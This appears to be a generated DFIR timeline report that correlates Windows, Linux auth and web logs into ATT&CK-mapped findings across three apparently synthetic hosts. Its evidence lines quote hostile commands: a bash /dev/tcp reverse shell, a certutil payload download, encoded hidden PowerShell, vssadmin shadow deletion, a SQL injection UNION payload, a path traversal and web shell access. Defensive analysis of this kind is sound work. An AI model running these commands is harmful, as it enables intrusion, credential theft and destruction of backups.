# DFIR timeline report

131 events from 3 file(s), 21 findings.

Range: 2026-03-14T00:10:00Z to 2026-03-14T04:05:57Z (UTC)

## Inputs

| File | Format | Events | Skipped |
|---|---|---:|---:|
| win-security.jsonl | win | 74 | 0 |
| auth.log | linux | 14 | 0 |
| access.log | web | 43 | 0 |

## Attack chains

- **ws-fin-07** 2026-03-14T02:10:00Z to 2026-03-14T02:24:05Z: Initial Access > Execution > Persistence > Privilege Escalation > Defense Evasion > Credential Access > Discovery > Command and Control > Impact (11 findings, critical)
- **web01** 2026-03-14T02:50:00Z to 2026-03-14T02:53:20Z: Initial Access > Persistence > Privilege Escalation > Credential Access > Command and Control (5 findings, critical)
- **web** 2026-03-14T03:00:00Z to 2026-03-14T03:03:10Z: Initial Access > Persistence > Discovery (4 findings, critical)

## Findings

### [CRITICAL] Brute force followed by successful logon

- When: 2026-03-14T02:10:00Z to 2026-03-14T02:12:20Z
- Host: ws-fin-07
- ATT&CK: Credential Access, T1110.001
- Detail: 14 failed logons from 203.0.113.45 then a success for jlopez. Treat the account as compromised.
- Evidence:
  - win-security.jsonl:21 2026-03-14T02:10:00Z Failed logon for jlopez from 203.0.113.45
  - win-security.jsonl:22 2026-03-14T02:10:09Z Failed logon for administrator from 203.0.113.45
  - win-security.jsonl:23 2026-03-14T02:10:18Z Failed logon for administrator from 203.0.113.45
  - win-security.jsonl:24 2026-03-14T02:10:27Z Failed logon for jlopez from 203.0.113.45
  - win-security.jsonl:25 2026-03-14T02:10:36Z Failed logon for administrator from 203.0.113.45
  - and 10 more

### [CRITICAL] Backup and recovery inhibited

- When: 2026-03-14T02:23:00Z
- Host: ws-fin-07
- ATT&CK: Impact, T1490
- Detail: vssadmin delete shadows /all /quiet
- Evidence:
  - win-security.jsonl:48 2026-03-14T02:23:00Z Process: vssadmin delete shadows /all /quiet

### [CRITICAL] Reverse shell

- When: 2026-03-14T02:52:10Z
- Host: web01
- ATT&CK: Command and Control, T1059.004
- Detail: /bin/bash -c 'bash -i >& /dev/tcp/198.51.100.77/4444 0>&1'
- Evidence:
  - auth.log:12 2026-03-14T02:52:10Z   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.77/4444 0>&1'

### [CRITICAL] SQL injection attempt (server answered 2xx)

- When: 2026-03-14T03:02:00Z
- Host: web
- ATT&CK: Initial Access, T1190
- Detail: GET /products.php?id=1' UNION SELECT username,password FROM users-- from 192.0.2.88 returned 200.
- Evidence:
  - access.log:41 2026-03-14T03:02:00Z GET /products.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- -> 200

### [CRITICAL] Path traversal attempt (server answered 2xx)

- When: 2026-03-14T03:02:30Z
- Host: web
- ATT&CK: Initial Access, T1190
- Detail: GET /download.php?f=../../../../etc/passwd from 192.0.2.88 returned 200.
- Evidence:
  - access.log:42 2026-03-14T03:02:30Z GET /download.php?f=../../../../etc/passwd -> 200

### [CRITICAL] Web shell access (server answered 2xx)

- When: 2026-03-14T03:03:10Z
- Host: web
- ATT&CK: Persistence, T1505.003
- Detail: POST /uploads/c99.php from 192.0.2.88 returned 200.
- Evidence:
  - access.log:43 2026-03-14T03:03:10Z POST /uploads/c99.php -> 200

### [HIGH] RDP logon from a public address

- When: 2026-03-14T02:12:20Z
- Host: ws-fin-07
- ATT&CK: Initial Access, T1133
- Detail: jlopez logged on over RDP from 203.0.113.45.
- Evidence:
  - win-security.jsonl:36 2026-03-14T02:12:20Z Logon type 10 for jlopez from 203.0.113.45

### [HIGH] Ingress tool transfer

- When: 2026-03-14T02:17:00Z
- Host: ws-fin-07
- ATT&CK: Command and Control, T1105
- Detail: certutil -urlcache -f http://198.51.100.9/upd.exe C:\Users\Public\upd.exe
- Evidence:
  - win-security.jsonl:41 2026-03-14T02:17:00Z Process: certutil -urlcache -f http://198.51.100.9/upd.exe C:\Users\Public\upd.exe

### [HIGH] Encoded PowerShell

- When: 2026-03-14T02:18:10Z
- Host: ws-fin-07
- ATT&CK: Execution, T1059.001
- Detail: powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
- Evidence:
  - win-security.jsonl:43 2026-03-14T02:18:10Z Process: powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA

### [HIGH] Suspicious service installed

- When: 2026-03-14T02:19:40Z
- Host: ws-fin-07
- ATT&CK: Persistence, T1543.003
- Detail: Service WinUpdSvc runs C:\Users\Public\upd.exe.
- Evidence:
  - win-security.jsonl:44 2026-03-14T02:19:40Z Service installed: WinUpdSvc -> C:\Users\Public\upd.exe

### [HIGH] Added to privileged group

- When: 2026-03-14T02:21:50Z
- Host: ws-fin-07
- ATT&CK: Privilege Escalation, T1098
- Detail: support$admin was added to Administrators.
- Evidence:
  - win-security.jsonl:47 2026-03-14T02:21:50Z Member added to group Administrators

### [HIGH] Event log cleared

- When: 2026-03-14T02:24:05Z
- Host: ws-fin-07
- ATT&CK: Defense Evasion, T1070.001
- Detail: Audit log was cleared by support$admin. Anything before this point on ws-fin-07 may be missing.
- Evidence:
  - win-security.jsonl:50 2026-03-14T02:24:05Z Event log cleared

### [HIGH] Kerberoasting pattern

- When: 2026-03-14T02:40:00Z to 2026-03-14T02:40:24Z
- Host: srv-dc-01
- ATT&CK: Credential Access, T1558.003
- Detail: 7 service tickets with RC4 encryption requested within 10 minutes.
- Evidence:
  - win-security.jsonl:53 2026-03-14T02:40:00Z Kerberos service ticket for MSSQLSvc/db01 (enc 0x17)
  - win-security.jsonl:54 2026-03-14T02:40:04Z Kerberos service ticket for HTTP/db01 (enc 0x17)
  - win-security.jsonl:55 2026-03-14T02:40:08Z Kerberos service ticket for CIFS/db01 (enc 0x17)
  - win-security.jsonl:56 2026-03-14T02:40:12Z Kerberos service ticket for svc-sql (enc 0x17)
  - win-security.jsonl:57 2026-03-14T02:40:16Z Kerberos service ticket for svc-web (enc 0x17)
  - and 2 more

### [HIGH] Password spraying

- When: 2026-03-14T02:50:00Z to 2026-03-14T02:50:42Z
- Host: web01
- ATT&CK: Credential Access, T1110.003
- Detail: 198.51.100.77 tried 8 different accounts (8 attempts) within 10 minutes.
- Evidence:
  - auth.log:2 2026-03-14T02:50:00Z Failed password for root from 198.51.100.77 port 40000 ssh2
  - auth.log:3 2026-03-14T02:50:06Z Failed password for invalid user admin from 198.51.100.77 port 40001 ssh2
  - auth.log:4 2026-03-14T02:50:12Z Failed password for invalid user ubuntu from 198.51.100.77 port 40002 ssh2
  - auth.log:5 2026-03-14T02:50:18Z Failed password for invalid user deploy from 198.51.100.77 port 40003 ssh2
  - auth.log:6 2026-03-14T02:50:24Z Failed password for invalid user postgres from 198.51.100.77 port 40004 ssh2
  - and 3 more

### [HIGH] Added to privileged group

- When: 2026-03-14T02:53:20Z
- Host: web01
- ATT&CK: Privilege Escalation, T1098
- Detail: sysupd was added to sudo.
- Evidence:
  - auth.log:14 2026-03-14T02:53:20Z add 'sysupd' to group 'sudo'

### [MEDIUM] Discovery commands in quick succession

- When: 2026-03-14T02:14:05Z to 2026-03-14T02:15:20Z
- Host: ws-fin-07
- ATT&CK: Discovery, T1087
- Detail: 4 enumeration commands within 3 minutes.
- Evidence:
  - win-security.jsonl:37 2026-03-14T02:14:05Z Process: whoami /all
  - win-security.jsonl:38 2026-03-14T02:14:30Z Process: net user
  - win-security.jsonl:39 2026-03-14T02:14:55Z Process: net localgroup administrators
  - win-security.jsonl:40 2026-03-14T02:15:20Z Process: systeminfo

### [MEDIUM] Scheduled task created

- When: 2026-03-14T02:20:15Z
- Host: ws-fin-07
- ATT&CK: Persistence, T1053.005
- Detail: Task \Microsoft\Windows\UpdateCheck created by jlopez.
- Evidence:
  - win-security.jsonl:45 2026-03-14T02:20:15Z Scheduled task created: \Microsoft\Windows\UpdateCheck

### [MEDIUM] Local account created

- When: 2026-03-14T02:21:30Z
- Host: ws-fin-07
- ATT&CK: Persistence, T1136.001
- Detail: Account support$admin created by jlopez.
- Evidence:
  - win-security.jsonl:46 2026-03-14T02:21:30Z User account created: support$admin

### [MEDIUM] SSH password logon from a public address

- When: 2026-03-14T02:51:05Z
- Host: web01
- ATT&CK: Initial Access, T1078
- Detail: deploy logged on from 198.51.100.77 with a password.
- Evidence:
  - auth.log:10 2026-03-14T02:51:05Z Accepted password for deploy from 198.51.100.77 port 40101 ssh2

### [MEDIUM] Local account created

- When: 2026-03-14T02:53:00Z
- Host: web01
- ATT&CK: Persistence, T1136.001
- Detail: Account sysupd created.
- Evidence:
  - auth.log:13 2026-03-14T02:53:00Z new user: name=sysupd, UID=1002, GID=1002, home=/home/sysupd, shell=/bin/bash

### [LOW] Web scanning

- When: 2026-03-14T03:00:00Z to 2026-03-14T03:01:27Z
- Host: web
- ATT&CK: Discovery, T1595.002
- Detail: 192.0.2.88 produced 30 client errors within 2 minutes.
- Evidence:
  - access.log:11 2026-03-14T03:00:00Z GET /admin0 -> 404
  - access.log:12 2026-03-14T03:00:03Z GET /backup1 -> 404
  - access.log:13 2026-03-14T03:00:06Z GET /wp-login.php2 -> 404
  - access.log:14 2026-03-14T03:00:09Z GET /.git/config3 -> 404
  - access.log:15 2026-03-14T03:00:12Z GET /phpmyadmin4 -> 404
  - and 25 more
